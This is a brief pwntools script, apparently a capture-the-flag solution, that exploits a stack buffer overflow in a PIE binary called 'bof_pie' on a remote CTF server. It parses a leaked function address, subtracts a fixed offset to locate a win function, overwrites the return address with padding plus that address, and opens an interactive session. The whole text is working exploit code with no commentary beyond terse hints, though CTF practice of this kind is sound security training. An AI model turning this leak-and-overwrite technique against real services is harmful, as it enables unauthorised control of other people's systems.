from pwn import *

#p=process("./bof_pie") #local; (PATH)
p=remote("ctf.j0n9hyun.xyz", 3008) #nc; (IP, PORT)


p.recvuntil("j0n9hyun is ")
addr_welcome=int(p.recv(10), 16) #recv n bit; (n)

addr_j0n9hyun=addr_welcome-0x79
payload='A'*0x12 + 'B'*4 + p32(addr_j0n9hyun)

p.sendline(payload)
p.interactive()
